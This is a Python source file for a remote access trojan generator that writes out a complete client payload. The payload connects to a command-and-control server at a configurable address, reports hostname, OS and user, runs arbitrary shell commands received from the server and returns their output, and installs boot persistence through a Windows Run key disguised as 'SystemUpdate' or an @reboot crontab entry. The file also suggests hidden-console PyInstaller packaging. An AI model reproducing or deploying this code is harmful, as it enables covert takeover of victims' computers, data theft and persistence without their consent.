#!/usr/bin/env python3
"""
RAT Payload Generator
Generates executable payloads with blockchain session persistence
"""

import os
import base64
import json
import hashlib
from datetime import datetime

class PayloadGenerator:
    """Generate RAT payloads with various configurations"""
    
    def __init__(self):
        self.template_dir = os.path.dirname(os.path.abspath(__file__))
        
    def generate_payload(self, server_ip, server_port, output_file, 
                        persistence=True, blockchain_enabled=True,
                        blockchain_host=None, blockchain_port=None):
        """
        Generate a Python-based payload
        
        Args:
            server_ip: C2 server IP address
            server_port: C2 server port
            output_file: Output file path for the payload
            persistence: Enable persistence on target
            blockchain_enabled: Enable blockchain session tracking
            blockchain_host: Blockchain server host (optional)
            blockchain_port: Blockchain server port (optional)
        """
        
        # Generate unique session ID
        session_id = hashlib.sha256(
            f"{server_ip}:{server_port}:{datetime.now().isoformat()}".encode()
        ).hexdigest()[:16]
        
        payload_code = self._generate_python_payload(
            server_ip, server_port, session_id,
            persistence, blockchain_enabled,
            blockchain_host or server_ip,
            blockchain_port or (server_port + 1000)
        )
        
        # Write payload to file
        with open(output_file, 'w') as f:
            f.write(payload_code)
        
        # Make executable on Unix systems
        if os.name != 'nt':
            os.chmod(output_file, 0o755)
        
        return {
            'session_id': session_id,
            'output_file': output_file,
            'server': f"{server_ip}:{server_port}",
            'blockchain_enabled': blockchain_enabled
        }
    
    def _generate_python_payload(self, server_ip, server_port, session_id,
                                 persistence, blockchain_enabled,
                                 blockchain_host, blockchain_port):
        """Generate Python payload code"""
        
        payload = f'''#!/usr/bin/env python3
"""
RAT Client Payload
Session ID: {session_id}
Generated: {datetime.now().isoformat()}
"""

import socket
import json
import platform
import os
import subprocess
import time
import sys
import threading
import hashlib
from datetime import datetime

# Configuration
SERVER_IP = "{server_ip}"
SERVER_PORT = {server_port}
SESSION_ID = "{session_id}"
PERSISTENCE_ENABLED = {persistence}
BLOCKCHAIN_ENABLED = {blockchain_enabled}
BLOCKCHAIN_HOST = "{blockchain_host}"
BLOCKCHAIN_PORT = {blockchain_port}

class BlockchainSession:
    """Blockchain-based session persistence"""
    
    def __init__(self, session_id, server_host, server_port):
        self.session_id = session_id
        self.server_host = server_host
        self.server_port = server_port
        self.chain = []
        self.pending_events = []
        
    def create_block(self, event_type, data):
        """Create a new block in the session chain"""
        previous_hash = self.chain[-1]['hash'] if self.chain else "0" * 64
        
        block = {{
            'index': len(self.chain),
            'timestamp': datetime.now().isoformat(),
            'session_id': self.session_id,
            'event_type': event_type,
            'data': data,
            'previous_hash': previous_hash
        }}
        
        block['hash'] = self._calculate_hash(block)
        self.chain.append(block)
        
        return block
    
    def _calculate_hash(self, block):
        """Calculate SHA-256 hash of block"""
        block_string = json.dumps({{
            'index': block['index'],
            'timestamp': block['timestamp'],
            'session_id': block['session_id'],
            'event_type': block['event_type'],
            'data': str(block['data']),
            'previous_hash': block['previous_hash']
        }}, sort_keys=True)
        
        return hashlib.sha256(block_string.encode()).hexdigest()
    
    def verify_chain(self):
        """Verify the integrity of the blockchain"""
        for i in range(1, len(self.chain)):
            current = self.chain[i]
            previous = self.chain[i-1]
            
            # Verify hash
            if current['hash'] != self._calculate_hash(current):
                return False
            
            # Verify chain
            if current['previous_hash'] != previous['hash']:
                return False
        
        return True
    
    def sync_to_server(self):
        """Sync blockchain to server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.server_host, self.server_port))
            
            sync_data = {{
                'type': 'blockchain_sync',
                'session_id': self.session_id,
                'chain': self.chain
            }}
            
            sock.send(json.dumps(sync_data).encode() + b'\\n')
            sock.close()
            return True
        except:
            return False

class RATClient:
    """RAT Client with blockchain session tracking"""
    
    def __init__(self):
        self.session_id = SESSION_ID
        self.running = False
        self.blockchain = None
        
        if BLOCKCHAIN_ENABLED:
            self.blockchain = BlockchainSession(
                SESSION_ID, BLOCKCHAIN_HOST, BLOCKCHAIN_PORT
            )
            self.blockchain.create_block('session_init', {{
                'hostname': platform.node(),
                'os': platform.system(),
                'version': platform.version()
            }})
    
    def get_system_info(self):
        """Gather system information"""
        try:
            info = {{
                'session_id': self.session_id,
                'hostname': platform.node(),
                'os': platform.system(),
                'os_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'user': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
                'python_version': platform.python_version()
            }}
            
            if BLOCKCHAIN_ENABLED and self.blockchain:
                self.blockchain.create_block('system_info_collected', info)
            
            return info
        except Exception as e:
            return {{'error': str(e)}}
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            if BLOCKCHAIN_ENABLED and self.blockchain:
                self.blockchain.create_block('command_received', {{'command': command}})
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            
            if BLOCKCHAIN_ENABLED and self.blockchain:
                self.blockchain.create_block('command_executed', {{
                    'command': command,
                    'return_code': result.returncode,
                    'output_length': len(output)
                }})
            
            return output
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {{str(e)}}"
    
    def connect_to_server(self):
        """Connect to C2 server"""
        while not self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((SERVER_IP, SERVER_PORT))
                
                # Send system info
                system_info = self.get_system_info()
                sock.send(json.dumps(system_info).encode() + b'\\n')
                
                if BLOCKCHAIN_ENABLED and self.blockchain:
                    self.blockchain.create_block('connected_to_server', {{
                        'server': f"{{SERVER_IP}}:{{SERVER_PORT}}"
                    }})
                    # Sync blockchain to server
                    threading.Thread(target=self.blockchain.sync_to_server, daemon=True).start()
                
                self.running = True
                self.handle_commands(sock)
                
            except Exception as e:
                time.sleep(5)  # Retry after 5 seconds
    
    def handle_commands(self, sock):
        """Handle incoming commands from server"""
        buffer = ""
        
        while self.running:
            try:
                data = sock.recv(4096).decode('utf-8')
                if not data:
                    break
                
                buffer += data
                
                while '\\n' in buffer:
                    line, buffer = buffer.split('\\n', 1)
                    
                    try:
                        cmd_data = json.loads(line)
                        command = cmd_data.get('cmd', '')
                        
                        if command:
                            result = self.execute_command(command)
                            
                            response = {{
                                'session_id': self.session_id,
                                'result': result
                            }}
                            
                            sock.send(json.dumps(response).encode() + b'\\n')
                    except json.JSONDecodeError:
                        pass
                        
            except Exception as e:
                break
        
        sock.close()
        self.running = False
        
        if BLOCKCHAIN_ENABLED and self.blockchain:
            self.blockchain.create_block('disconnected', {{'reason': 'connection_lost'}})
    
    def install_persistence(self):
        """Install persistence mechanism"""
        if not PERSISTENCE_ENABLED:
            return
        
        try:
            script_path = os.path.abspath(__file__)
            
            if platform.system() == "Windows":
                # Windows Registry persistence
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
                                 f'python "{{script_path}}"')
                winreg.CloseKey(key)
            else:
                # Linux/Mac crontab persistence
                cron_cmd = f"@reboot python3 {{script_path}}"
                os.system(f'(crontab -l 2>/dev/null; echo "{{cron_cmd}}") | crontab -')
            
            if BLOCKCHAIN_ENABLED and self.blockchain:
                self.blockchain.create_block('persistence_installed', {{
                    'method': 'registry' if platform.system() == "Windows" else 'crontab'
                }})
                
        except Exception as e:
            pass
    
    def run(self):
        """Main run loop"""
        self.install_persistence()
        self.connect_to_server()

if __name__ == "__main__":
    try:
        client = RATClient()
        client.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        pass
'''
        
        return payload
    
    def generate_windows_exe(self, server_ip, server_port, output_file):
        """
        Generate Windows executable (requires PyInstaller)
        This is a placeholder - actual implementation would use PyInstaller
        """
        py_file = output_file.replace('.exe', '.py')
        self.generate_payload(server_ip, server_port, py_file)
        
        return {
            'status': 'python_payload_created',
            'note': 'Use PyInstaller to convert to .exe: pyinstaller --onefile --noconsole ' + py_file,
            'python_file': py_file
        }

if __name__ == "__main__":
    # Test payload generation
    gen = PayloadGenerator()
    result = gen.generate_payload(
        server_ip="192.168.1.100",
        server_port=4444,
        output_file="test_payload.py",
        persistence=True,
        blockchain_enabled=True
    )
    print(json.dumps(result, indent=2))

